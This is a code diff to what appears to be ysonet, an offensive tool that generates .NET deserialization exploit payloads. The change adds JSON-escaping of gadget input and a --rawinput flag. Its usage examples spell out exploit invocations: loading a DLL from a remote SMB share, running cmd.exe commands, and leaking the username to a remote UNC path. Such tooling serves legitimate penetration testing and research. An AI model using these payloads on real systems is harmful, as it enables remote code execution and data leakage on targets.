@@ -22,6 +22,7 @@ namespace ysonet.Plugins
         private static bool removeVersion;
         private static bool test;
         private static bool minify;
+        private static bool rawInput;
 
         private static readonly OptionSet options = new OptionSet
         {
@@ -34,6 +35,11 @@ namespace ysonet.Plugins
             {"i|input=", "input to the gadget", v => input = v},
             {"g|gadget=", "gadget to use", v => gadget = v},
             {"f|formatter=", "formatter to use", v => formatter = v},
+            {"rawinput", "pass the input verbatim into the JSON template instead of JSON-escaping it. By default a backslash/quote in the input is escaped so a natural path like \\\\host\\share works; use this only when you need to supply already-escaped or literal JSON.", v =>
+                {
+                    if (v != null) rawInput = true;
+                }
+            },
             {"r", "removes version and pubkeytoken from types, it may be useful when we do not know the version of targeted library or require a short payload", v =>
                 {
                     if (v != null) removeVersion = true;
@@ -150,13 +156,13 @@ Exemplary usage:
 
     ysonet.exe -p ThirdPartyGadgets -l
 
-    ysonet.exe -p ThirdPartyGadgets -f Json.NET -g UnmanagedLibrary -i \\\\192.168.1.100\\poc\\cppDll.dll -r
+    ysonet.exe -p ThirdPartyGadgets -f Json.NET -g UnmanagedLibrary -i \\192.168.1.100\poc\cppDll.dll -r
 
     ysonet.exe -p ThirdPartyGadgets -f Json.NET -g GetterActiveMQObjectMessage -i ""cmd.exe /c calc.exe""
 
     ysonet.exe -p ThirdPartyGadgets -f Json.NET -g QueryPartitionProvider -i ""C:\Users\Public\inner.json""
 
-    ysonet.exe -p ThirdPartyGadgets -f Json.NET -g FileDiagnosticsTelemetryModule -i ""\\\\192.168.1.100\\%USERNAME%""
+    ysonet.exe -p ThirdPartyGadgets -f Json.NET -g FileDiagnosticsTelemetryModule -i ""\\192.168.1.100\%USERNAME%""
 
 ";
         }
@@ -513,45 +519,56 @@ Exemplary usage:
             //gadgets generation
             String payload = "";
 
+            // The input is JSON-escaped by default so a natural path such as \\host\share or
+            // C:\dir\file works without the user hand-escaping every backslash (a raw backslash
+            // is an invalid JSON escape and breaks the payload / the --minify re-parse). Gadgets
+            // that TEMPLATE the input into a JSON string literal get jsonSafeInput; gadgets that
+            // read the input as a file path or run it as a command get the raw input. A new
+            // path-templating gadget should use jsonSafeInput and is then safe by default; pass
+            // --rawinput to supply already-escaped or literal JSON.
+            string jsonSafeInput = rawInput ? input : CommandArgSplitter.JsonStringEscape(input);
+
             if (gadget.ToLower() == "unmanagedlibrary")
             {
-                payload = UnmanagedLibrary(input, formatter);
+                payload = UnmanagedLibrary(jsonSafeInput, formatter);
             }
             else if (gadget.ToLower() == "windowslibrary")
             {
-                payload = WindowsLibrary(input, formatter);
+                payload = WindowsLibrary(jsonSafeInput, formatter);
             }
             else if (gadget.ToLower() == "xunit1executor")
             {
-                payload = Xunit1Executor(input, formatter);
+                payload = Xunit1Executor(jsonSafeInput, formatter);
             }
             else if (gadget.ToLower() == "getteractivemqobjectmessage")
             {
+                // input is used as a shell command, not templated into JSON: keep it raw.
                 payload = GetterActiveMQObjectMessage(input, formatter);
             }
             else if (gadget.ToLower() == "preserveworkingfolder")
             {
-                payload = PreserveWorkingFolder(input, formatter);
+                payload = PreserveWorkingFolder(jsonSafeInput, formatter);
             }
             else if (gadget.ToLower() == "optimisticlockedtextfile")
             {
-                payload = OptimisticLockedTextFile(input, formatter);
+                payload = OptimisticLockedTextFile(jsonSafeInput, formatter);
             }
             else if (gadget.ToLower() == "querypartitionprovider")
             {
+                // input is a path read from disk (File.Exists / ReadAllText): keep it raw.
                 payload = QueryPartitionProvider(input, formatter);
             }
             else if (gadget.ToLower() == "filediagnosticstelemetrymodule")
             {
-                payload = FileDiagnosticsTelemetryModule(input, formatter);
+                payload = FileDiagnosticsTelemetryModule(jsonSafeInput, formatter);
             }
             else if (gadget.ToLower() == "singleprocessfileappender")
             {
-                payload = SingleProcessFileAppender(input, formatter);
+                payload = SingleProcessFileAppender(jsonSafeInput, formatter);
             }
             else if (gadget.ToLower() == "filedatastore")
             {
-                payload = FileDataStore(input, formatter);
+                payload = FileDataStore(jsonSafeInput, formatter);
             }
             else
             {
